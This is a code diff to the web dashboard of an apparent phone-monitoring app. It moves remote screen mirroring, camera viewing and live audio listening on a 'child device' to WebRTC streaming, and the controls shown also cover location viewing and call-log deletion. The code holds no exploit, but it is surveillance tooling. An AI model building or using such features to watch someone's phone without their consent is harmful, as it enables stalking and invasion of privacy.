@@ -142,10 +142,10 @@ function setupEventListeners() {
   document.getElementById('closePairing').addEventListener('click', hidePairingModal);
   document.getElementById('btnNewCode').addEventListener('click', generatePairingCode);
   
-  // Quick actions
-  document.getElementById('btnScreenMirror').addEventListener('click', () => startStream('screen'));
-  document.getElementById('btnCamera').addEventListener('click', () => startStream('camera'));
-  document.getElementById('btnLiveListen').addEventListener('click', () => startStream('audio'));
+  // Quick actions - Use WebRTC for streaming
+  document.getElementById('btnScreenMirror').addEventListener('click', () => startWebRTCStream('screen'));
+  document.getElementById('btnCamera').addEventListener('click', () => startWebRTCStream('camera'));
+  document.getElementById('btnLiveListen').addEventListener('click', () => startWebRTCStream('audio'));
   document.getElementById('btnViewLocation').addEventListener('click', () => navigateTo('location'));
   document.getElementById('btnOpenApp')?.addEventListener('click', () => sendCommand('open_app'));
   document.getElementById('btnDeleteCallLogs').addEventListener('click', deleteCallLogs);
@@ -1381,6 +1381,341 @@ function stopAudioPlayback() {
   }
 }
 
+// ================== WebRTC Streaming ==================
+let webrtcPeerConnection = null;
+let webrtcSignalingSocket = null;
+let webrtcRemoteStream = null;
+let pendingIceCandidates = [];
+let isRemoteDescriptionSet = false;
+
+const ICE_SERVERS = [
+  { urls: 'stun:stun.l.google.com:19302' },
+  { urls: 'stun:stun1.l.google.com:19302' },
+  { urls: 'stun:stun2.l.google.com:19302' },
+  { urls: 'stun:stun3.l.google.com:19302' },
+  { urls: 'stun:stun4.l.google.com:19302' }
+];
+
+function startWebRTCStream(type) {
+  if (!selectedDevice) {
+    alert('Please select a device first');
+    return;
+  }
+  
+  const modal = document.getElementById('streamModal');
+  const title = document.getElementById('streamTitle');
+  const streamVideo = document.getElementById('streamVideo');
+  
+  const titles = {
+    screen: 'Screen Mirror (WebRTC)',
+    camera: 'Remote Camera (WebRTC)',
+    audio: 'Live Listen (WebRTC)'
+  };
+  
+  currentStreamType = type;
+  title.textContent = titles[type];
+  modal.classList.remove('hidden');
+  streamVideo.innerHTML = '<p class="connecting">Initializing WebRTC connection...</p>';
+  
+  // Send command to child device to start WebRTC streaming
+  const commands = {
+    screen: 'start_webrtc_screen',
+    camera: 'start_webrtc_camera',
+    audio: 'start_webrtc_audio'
+  };
+  
+  sendCommand(commands[type], {}, true);
+  
+  // Connect to WebRTC signaling server
+  const deviceId = selectedDevice.deviceId || selectedDevice.id;
+  const sessionId = `${deviceId}_${type}_webrtc`;
+  const wsUrl = `${WS_BASE}/webrtc?session=${sessionId}&role=receiver&deviceId=${deviceId}&type=${type}`;
+  
+  console.log('[WebRTC] Connecting to signaling:', wsUrl);
+  
+  // Close existing connections
+  closeWebRTCConnection();
+  
+  // Reset state
+  pendingIceCandidates = [];
+  isRemoteDescriptionSet = false;
+  
+  // Connect to signaling server
+  webrtcSignalingSocket = new WebSocket(wsUrl);
+  
+  webrtcSignalingSocket.onopen = () => {
+    console.log('[WebRTC] Signaling connected');
+    streamVideo.innerHTML = '<p class="connecting">Waiting for device stream...</p>';
+    
+    // Send join message
+    webrtcSignalingSocket.send(JSON.stringify({
+      type: 'join',
+      deviceId: deviceId,
+      streamType: type,
+      role: 'receiver'
+    }));
+  };
+  
+  webrtcSignalingSocket.onmessage = (event) => {
+    try {
+      const message = JSON.parse(event.data);
+      handleWebRTCSignalingMessage(message, type);
+    } catch (e) {
+      console.error('[WebRTC] Error parsing message:', e);
+    }
+  };
+  
+  webrtcSignalingSocket.onerror = (error) => {
+    console.error('[WebRTC] Signaling error:', error);
+    streamVideo.innerHTML = '<p class="error">Connection error. Please try again.</p>';
+  };
+  
+  webrtcSignalingSocket.onclose = () => {
+    console.log('[WebRTC] Signaling closed');
+  };
+}
+
+function handleWebRTCSignalingMessage(message, type) {
+  console.log('[WebRTC] Received:', message.type);
+  const streamVideo = document.getElementById('streamVideo');
+  
+  switch (message.type) {
+    case 'sender_joined':
+      streamVideo.innerHTML = '<p class="connecting">Device connected, establishing stream...</p>';
+      break;
+      
+    case 'offer':
+      handleWebRTCOffer(message, type);
+      break;
+      
+    case 'ice_candidate':
+      handleRemoteIceCandidate(message);
+      break;
+      
+    case 'stream_started':
+      console.log('[WebRTC] Stream started');
+      break;
+      
+    case 'stream_stopped':
+    case 'sender_left':
+      streamVideo.innerHTML = '<p class="connecting">Stream ended by device.</p>';
+      break;
+      
+    case 'waiting':
+      streamVideo.innerHTML = '<p class="connecting">Waiting for device to start streaming...</p>';
+      break;
+      
+    case 'error':
+      streamVideo.innerHTML = `<p class="error">Error: ${message.message || 'Unknown error'}</p>`;
+      break;
+      
+    case 'ping':
+      webrtcSignalingSocket?.send(JSON.stringify({ type: 'pong' }));
+      break;
+  }
+}
+
+async function handleWebRTCOffer(message, type) {
+  try {
+    console.log('[WebRTC] Processing offer');
+    const streamVideo = document.getElementById('streamVideo');
+    
+    // Create peer connection
+    webrtcPeerConnection = new RTCPeerConnection({ iceServers: ICE_SERVERS });
+    
+    // Handle incoming tracks
+    webrtcPeerConnection.ontrack = (event) => {
+      console.log('[WebRTC] Track received:', event.track.kind);
+      
+      if (!webrtcRemoteStream) {
+        webrtcRemoteStream = new MediaStream();
+      }
+      webrtcRemoteStream.addTrack(event.track);
+      
+      // Display based on track type
+      if (event.track.kind === 'video') {
+        displayWebRTCVideo(webrtcRemoteStream);
+      } else if (event.track.kind === 'audio') {
+        if (type === 'audio') {
+          displayWebRTCAudio(webrtcRemoteStream);
+        } else {
+          // Add audio to video element
+          const video = streamVideo.querySelector('video');
+          if (video && video.srcObject) {
+            video.srcObject.addTrack(event.track);
+          }
+        }
+      }
+    };
+    
+    // Handle ICE candidates
+    webrtcPeerConnection.onicecandidate = (event) => {
+      if (event.candidate) {
+        console.log('[WebRTC] Sending ICE candidate');
+        webrtcSignalingSocket?.send(JSON.stringify({
+          type: 'ice_candidate',
+          candidate: event.candidate.candidate,
+          sdpMid: event.candidate.sdpMid,
+          sdpMLineIndex: event.candidate.sdpMLineIndex
+        }));
+      }
+    };
+    
+    // Handle connection state changes
+    webrtcPeerConnection.onconnectionstatechange = () => {
+      console.log('[WebRTC] Connection state:', webrtcPeerConnection.connectionState);
+      
+      switch (webrtcPeerConnection.connectionState) {
+        case 'connected':
+          console.log('[WebRTC] Connected!');
+          break;
+        case 'disconnected':
+        case 'failed':
+          streamVideo.innerHTML = '<p class="error">Connection lost. Try again.</p>';
+          break;
+      }
+    };
+    
+    // Handle ICE connection state
+    webrtcPeerConnection.oniceconnectionstatechange = () => {
+      console.log('[WebRTC] ICE state:', webrtcPeerConnection.iceConnectionState);
+    };
+    
+    // Set remote description (offer)
+    const offer = new RTCSessionDescription({
+      type: 'offer',
+      sdp: message.sdp
+    });
+    
+    await webrtcPeerConnection.setRemoteDescription(offer);
+    isRemoteDescriptionSet = true;
+    console.log('[WebRTC] Remote description set');
+    
+    // Process pending ICE candidates
+    for (const candidate of pendingIceCandidates) {
+      await webrtcPeerConnection.addIceCandidate(candidate);
+    }
+    pendingIceCandidates = [];
+    
+    // Create and send answer
+    const answer = await webrtcPeerConnection.createAnswer();
+    await webrtcPeerConnection.setLocalDescription(answer);
+    
+    webrtcSignalingSocket?.send(JSON.stringify({
+      type: 'answer',
+      sdp: answer.sdp
+    }));
+    
+    console.log('[WebRTC] Answer sent');
+    
+  } catch (e) {
+    console.error('[WebRTC] Error handling offer:', e);
+    document.getElementById('streamVideo').innerHTML = 
+      `<p class="error">Failed to establish connection: ${e.message}</p>`;
+  }
+}
+
+async function handleRemoteIceCandidate(message) {
+  try {
+    const candidate = new RTCIceCandidate({
+      candidate: message.candidate,
+      sdpMid: message.sdpMid,
+      sdpMLineIndex: message.sdpMLineIndex
+    });
+    
+    if (isRemoteDescriptionSet && webrtcPeerConnection) {
+      await webrtcPeerConnection.addIceCandidate(candidate);
+      console.log('[WebRTC] ICE candidate added');
+    } else {
+      pendingIceCandidates.push(candidate);
+      console.log('[WebRTC] ICE candidate queued');
+    }
+  } catch (e) {
+    console.error('[WebRTC] Error adding ICE candidate:', e);
+  }
+}
+
+function displayWebRTCVideo(stream) {
+  const streamVideo = document.getElementById('streamVideo');
+  streamVideo.innerHTML = '';
+  
+  const video = document.createElement('video');
+  video.autoplay = true;
+  video.playsInline = true;
+  video.muted = false;
+  video.style.cssText = 'width: 100%; height: 100%; object-fit: contain; background: black;';
+  video.srcObject = stream;
+  
+  // Play video
+  video.play().catch(e => {
+    console.error('[WebRTC] Error playing video:', e);
+    // Add play button for user interaction
+    const playBtn = document.createElement('button');
+    playBtn.textContent = 'Click to Play';
+    playBtn.className = 'btn btn-primary';
+    playBtn.onclick = () => video.play();
+    streamVideo.appendChild(playBtn);
+  });
+  
+  streamVideo.appendChild(video);
+}
+
+function displayWebRTCAudio(stream) {
+  const streamVideo = document.getElementById('streamVideo');
+  
+  // Create audio element
+  const audio = document.createElement('audio');
+  audio.autoplay = true;
+  audio.srcObject = stream;
+  audio.style.display = 'none';
+  
+  // Visual indicator
+  streamVideo.innerHTML = `
+    <div class="audio-indicator active">
+      <i class="material-icons">hearing</i>
+      <p>🎧 Live Audio Connected</p>
+      <div class="audio-visualizer">
+        <span></span><span></span><span></span><span></span><span></span>
+      </div>
+    </div>
+  `;
+  
+  streamVideo.appendChild(audio);
+  
+  // Start playing
+  audio.play().catch(e => {
+    console.error('[WebRTC] Error playing audio:', e);
+    const playBtn = document.createElement('button');
+    playBtn.textContent = 'Click to Enable Audio';
+    playBtn.className = 'btn btn-primary';
+    playBtn.style.marginTop = '20px';
+    playBtn.onclick = () => audio.play();
+    streamVideo.appendChild(playBtn);
+  });
+}
+
+function closeWebRTCConnection() {
+  if (webrtcPeerConnection) {
+    webrtcPeerConnection.close();
+    webrtcPeerConnection = null;
+  }
+  
+  if (webrtcSignalingSocket) {
+    webrtcSignalingSocket.close();
+    webrtcSignalingSocket = null;
+  }
+  
+  if (webrtcRemoteStream) {
+    webrtcRemoteStream.getTracks().forEach(track => track.stop());
+    webrtcRemoteStream = null;
+  }
+  
+  pendingIceCandidates = [];
+  isRemoteDescriptionSet = false;
+}
+
+// ================== Legacy Streaming (fallback) ==================
+
 function startStream(type) {
   if (!selectedDevice) {
     alert('Please select a device first');
@@ -1705,6 +2040,9 @@ function displayVideoFrame(base64Data) {
 let currentStreamType = null;
 
 function stopStream() {
+  // Close WebRTC connections first
+  closeWebRTCConnection();
+  
   if (streamSocket) {
     streamSocket.close();
     streamSocket = null;
@@ -1722,8 +2060,20 @@ function stopStream() {
     audio: 'stop_live_listen'
   };
   
-  if (currentStreamType && stopCommands[currentStreamType]) {
-    sendCommand(stopCommands[currentStreamType]);
+  // Also send WebRTC stop commands
+  const webrtcStopCommands = {
+    screen: 'stop_webrtc_screen',
+    camera: 'stop_webrtc_camera',
+    audio: 'stop_webrtc_audio'
+  };
+  
+  if (currentStreamType) {
+    if (stopCommands[currentStreamType]) {
+      sendCommand(stopCommands[currentStreamType]);
+    }
+    if (webrtcStopCommands[currentStreamType]) {
+      sendCommand(webrtcStopCommands[currentStreamType]);
+    }
   }
   currentStreamType = null;
 }
